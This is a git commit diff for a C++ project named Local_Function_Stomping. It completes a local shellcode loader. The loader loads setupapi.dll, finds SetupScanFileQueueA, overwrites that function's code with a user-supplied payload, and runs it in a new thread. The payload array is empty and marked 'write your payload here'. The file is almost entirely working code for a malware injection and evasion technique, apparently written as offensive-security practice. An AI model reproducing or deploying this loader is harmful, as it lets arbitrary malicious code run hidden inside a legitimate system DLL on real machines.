91716fee14b9159effd4af8f13839d5db114b455
AbdouRoumi <a_roumi@estin.dz>
2024-12-14 19:05:22 +0100

    Local completed

--- Local_Function_Stomping/Local_Function_Stomping.cpp
+++ Local_Function_Stomping/Local_Function_Stomping.cpp
@@ -3,8 +3,10 @@
 #include <stdio.h>
 
 
-#define SACRIFICAL_DLL "setupapi.dll"
-#define SACRIFICAL_FUNC "SetupScanFileQueueA"
+#define SACRIFICIAL_DLL "setupapi.dll"
+#define SACRIFICIAL_FUNC "SetupScanFileQueueA"
+//write your payload here
+unsigned char Payload[] = "";
 
 
 BOOL WritePayload(IN PVOID pAddress , IN PBYTE pPayload , IN SIZE_T sPayloadSize) {
@@ -32,13 +34,45 @@ int main() {
 	HMODULE hModule = NULL;
 	HANDLE hThread;
 
-	printf("Let's load our Sacrificial dll, %s\n", SACRIFICAL_DLL);
+	printf("Let's load our Sacrificial dll, %s\n", SACRIFICIAL_DLL);
 	
 	getchar();
-	hModule = LoadLibraryA(SACRIFICAL_DLL);
+	hModule = LoadLibraryA(SACRIFICIAL_DLL);
 	if (hModule == NULL) {
 		printf("[!]Load Libarary failed!! error : %d\n",GetLastError());
+		return EXIT_FAILURE;
+	}
+	printf("[+] DONE \n");
+	
+	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
+	if (pAddress == NULL) {
+		printf("Error GetProcAddress error : %d\n", GetLastError());
+		return EXIT_FAILURE;
 	}
 
+	printf("Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC,pAddress);
+
+	printf("[#] Press <Enter> To Write Payload ... ");
+	getchar();
+	printf("[i] Writing ... ");
+	if (!WritePayload(pAddress, Payload, sizeof(Payload))) {
+		return -1;
+	}
+	printf("[+] DONE \n");
+
+
+	printf("[#] Press <Enter> To Run The Payload ... ");
+	getchar();
+
+
+	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
+	if (hThread != NULL)
+		printf("Hi");
+		WaitForSingleObject(hThread, INFINITE);
+
+	printf("[#] Press <Enter> To Quit ... ");
+	getchar();
+
+	return EXIT_SUCCESS;
 
 }
